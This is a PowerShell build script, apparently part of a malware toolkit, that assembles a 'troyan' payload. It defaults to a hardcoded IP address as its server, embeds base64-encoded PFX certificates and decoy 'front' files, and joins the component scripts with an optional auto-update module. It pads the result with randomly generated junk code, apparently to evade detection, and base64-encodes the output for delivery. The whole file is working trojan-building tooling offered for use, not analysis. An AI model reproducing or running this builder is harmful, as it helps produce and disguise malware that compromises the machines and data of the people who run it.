param (
    [string]$serverName
)

if ($serverName -eq "") {
    $serverName = "185.247.141.125"
    $action = "exe"
} 

if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName


Set-Location -Path $scriptDir
. ".\troyancompile.randomer.ps1"



Write-Host "troyan"

function GetUtfNoBom {
    param (
        [string]$file
    )

    # Read the file as a byte array
    $contentBytes = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($contentBytes.Length -ge 3 -and $contentBytes[0] -eq 0xEF -and $contentBytes[1] -eq 0xBB -and $contentBytes[2] -eq 0xBF) {
        # Remove the BOM
        $contentBytes = $contentBytes[3..($contentBytes.Length - 1)]
    }

    # Convert the byte array back to a UTF-8 string
    $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)

    return $contentWithoutBom
}

$outPath = Join-Path -Path $server.troyanDir -ChildPath "_output"
if (-not (Test-Path $outPath )) {
    New-Item -Path $outPath  -ItemType Directory
}
if (Test-Path -Path $server.troyanScript) {
    Remove-Item -Path $server.troyanScript
}
if (Test-Path -Path $server.troyanScriptClean) {
    Remove-Item -Path $server.troyanScriptClean
}

function Utf8NoBom {
    param (
        [string]$data,
        [string]$file
    )

    # Create a StreamWriter to write without BOM
    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
    $streamWriter.Write($data)
    $streamWriter.Close()

    # Forcefully overwrite the file to ensure no BOM is present
    # Read back the written file as byte array
    $writtenContent = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
        # Remove the BOM bytes
        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
    }

    # Write back the content without BOM
    [System.IO.File]::WriteAllBytes($file, $writtenContent)
}


function Filter-ObjectByKeywords {
    param (
        [Parameter(Mandatory = $true)]
        [PSObject]$object,
        
        [Parameter(Mandatory = $true)]
        [string[]]$keywords
    )

    # Create a new empty custom object
    $filteredObject = [PSCustomObject]@{}

    # Iterate over each property of the input object
    foreach ($property in $object.PSObject.Properties) {
        # Check if the property name contains any of the keywords
        $shouldInclude = $true
        foreach ($keyword in $keywords) {
            if ($property.Name -like "*$keyword*") {
                $shouldInclude = $false
                break
            }
        }

        # If the property name does not match any keyword, add it to the new object
        if ($shouldInclude) {
            $filteredObject | Add-Member -MemberType NoteProperty -Name $property.Name -Value $property.Value
        }
    }

    return $filteredObject
}



function Encode-FileToBase64 {
    param (
        [string]$inFile
    )
    if (-Not (Test-Path -Path $inFile)) {
        return "File $inFile not found."
    }
    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
    $encodedContent = [Convert]::ToBase64String($fileContent)
    return $encodedContent
}

function Convert-ArrayToQuotedString {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Array
    )

    # Process each element to enclose in double quotes and join with commas
    $quotedArray = $Array | ForEach-Object { "`"$_`"" }
    $joinedString = $quotedArray -join ","

    return $joinedString
}

Function Check-Array {
    param (
        [object]$InputObject
    )

    if ($null -ne $InputObject -and $InputObject.Length -gt 0 -and $InputObject -ne '') {
        return $true
    } else {
        return $false
    }
}


function Create-EmbeddingFiles {
    param (
        [string]$name
    )

    $srcFolder = Join-Path -Path $server.userDataDir -ChildPath "$name"

    if (-not (Test-Path -Path $srcFolder))
    {
        $files = @()
    } else
    {
        $files = (Get-ChildItem -Path $srcFolder -File) 
    }
    if ($null -eq $files){
        $files = @()
    }
    if (-not ($files.GetType().Name -eq 'Object[]')) {
        $files = @($files)
    }
    
    $resultName = @()
    $resultData = @()
    foreach ($file in $files) {
        $filename = [System.IO.Path]::GetFileName($file.FullName)
        $data= Encode-FileToBase64 -inFile $file.FullName
        $resultData += $data
        $resultName += $filename
    }
    if (Check-Array -InputObject $resultData -eq $true)
    {
        $joinedResultName = Convert-ArrayToQuotedString -Array $resultName
        $joinedResultData = Convert-ArrayToQuotedString -Array $resultData
        return ($joinedResultName, $joinedResultData)
    } else {
        return ($null, $null)
    }
}

function Format-ArrayToString {
    param (
        [string[]]$inputArray
    )
    if ($inputArray -eq $null -or $inputArray.Length -eq 0) {
        return ""
    }
    $result = ""
    foreach ($item in $inputArray) {
        $result += "'${item}', "
    }
    $result = $result.TrimEnd(', ')
    return $result
}

#certs
$template = @"
`$server = '_SERVER' | ConvertFrom-Json
`$xdata = @{
    _CERT
}
`$xfront = @(
_FRONT_X
)
`$xfront_name = @(
_FRONT_NAME
)
`$xembed = @(
_EMBED_X
)
`$xembed_name = @(
_EMBED_NAME
)
"@
$stringList = @()
foreach ($domain in $server.domains) {
    $pathPfx = pfxFile($domain)
    if ([string]::IsNullOrEmpty($pathPfx)) {
        throw "The certficiate is not found for domain: $domain"
    }
    $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
    $base64 = [Convert]::ToBase64String($binaryData)
    $chunkSize = 200
    $chunks = @()
    for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
        $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
        $chunks += $chunk
    }
    $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
    $stringList += "'" + $domain + "'=" + $code
}
$listString = $stringList -join [System.Environment]::NewLine
$template  = $template -replace "_CERT", $listString

($name, $data) = Create-EmbeddingFiles -name "front"
$template = $template -replace "_FRONT_X", $data
$template = $template -replace "_FRONT_NAME", $name
($name, $data) = Create-EmbeddingFiles -name "embeddings"
$template = $template -replace "_EMBED_X", $data
$template = $template -replace "_EMBED_NAME", $name


$keywords = @("Dir", "troyan", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing","php")
$filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
$servStr = ($filteredObject | ConvertTo-Json)
$template  = $template -replace "_SERVER", $servStr
$template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath 'consts.ps1')

#join
$ps1Files = @(
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "consts.ps1"),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "utils.ps1"),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" })
) | ForEach-Object { $_ } | Where-Object { $_ -ne $null }

if ($server.autoUpdate)
{
    $ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "extraupdate.ps1")
}

$ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "program.ps1")

function BuldScript{
    param (
        [string]$outputFile, [bool]$random)

        $pref = '
        # $generalJob = Start-Job -ScriptBlock {

            function writedbg2 {
                    param (
                        [string]$msg,   [string]$msg2=""
                    )
                }
                '

        $suff = '
       #    }
       # Wait-Job -Job $generalJob
       # Receive-Job -Job $generalJob
       # Remove-Job -Job $generalJob
        ';


    $joinedContent = $pref
    if ($random -eq $true)
    {
        $joinedContent += Generate-RandomCode
    }
    foreach ($file in $ps1Files) {
        $fileContent = GetUtfNoBom -file $file.FullName
        $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
        $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
        if ($random -eq $true)
        {
            $joinedContent += Generate-RandomCode
        }
        $joinedContent += $fileContent + [System.Environment]::NewLine
    }
    if ($random -eq $true)
    {
        $joinedContent += Generate-RandomCode
    }
    $joinedContent += $suff
    if ($random -eq $true)
    {
        $joinedContent += Generate-RandomCode
    }
    Utf8NoBom -data $joinedContent -file $outputFile
}

BuldScript -outputFile $server.troyanScript -random $true
BuldScript -outputFile $server.troyanScriptClean -random $false


$encoded = Encode-FileToBase64 -inFile $server.troyanScript
Utf8NoBom -data $encoded -file $server.userPowershellFile




Write-Host "Troyan Compile complete"
